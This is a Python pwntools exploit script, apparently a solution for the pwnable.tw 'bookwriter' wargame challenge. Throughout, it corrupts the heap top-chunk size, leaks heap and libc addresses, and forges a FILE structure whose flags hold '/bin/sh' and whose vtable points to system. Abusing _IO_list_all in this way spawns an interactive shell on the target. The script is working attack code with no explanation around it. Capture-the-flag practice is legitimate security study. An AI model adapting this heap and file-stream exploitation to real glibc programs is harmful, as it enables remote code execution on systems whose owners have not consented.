#!/usr/bin/python3

from pwn import *

exe = ELF('bookwriter_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnable.tw', 10304)
else:
        p = process(exe.path)

GDB()
def create(size, payload):
        sla(b"choice :", b"1")
        sla(b"page :", str(size).encode())
        sa(b"Content :", payload)
def view(idx):
        sla(b"choice :", b'2')
        sla(b" :", str(idx).encode())
def edit(idx, payload):
        sla(b"choice :", b'3')
        sla(b"page :", str(idx).encode())
        sla(b"tent:", payload)


sla(b" :", b"w"*0x40 + b'')
create(0x28, b'a') #idx 0

edit(0, b"a" * 0x28)        
edit(0, b"a" * 0x28 + p64(0xfd1))        

create(0x1000, b'\0')

# Leak heap
sla(b"choice :", b'4')
p.recvuntil(b'w'*0x40)
heap = u64(p.recvline(keepends= False).ljust(8, b'\0')) - 0x10
info("Heap: " + hex(heap))
sla(b"no:0)", b"0")

       
# leak libc
create(0x40, b'a' * 8)
view(2)
p.recvuntil(b'a'*8)
libc.address = u64(p.recvline(keepends= False) + b'\0\0') - 0x3c4188
info("Libc: " + hex(libc.address))

# ow store_size[0]
edit(0, b"\0" * 0x28)        

for i in range(3, 9):
        create(0x28, b'a' * 0x28)


f = FileStructure()
f.flags = b'/bin/sh\0'
f._IO_read_ptr = 0x61
f._IO_read_end = libc.address
f._IO_read_base = libc.sym._IO_list_all - 0x10
f._IO_write_base = 2
f._IO_write_ptr = 3
f.vtable = heap+0x280
edit(0, b'a' * 0x190 + bytes(f) + flat(0, 0, 0, libc.sym.system))
edit(0, b'\0')
p.recvuntil('Your choice :')
p.sendline(b'1')
p.recvuntil('Size of page :')
p.sendline(b'20')
p.interactive()
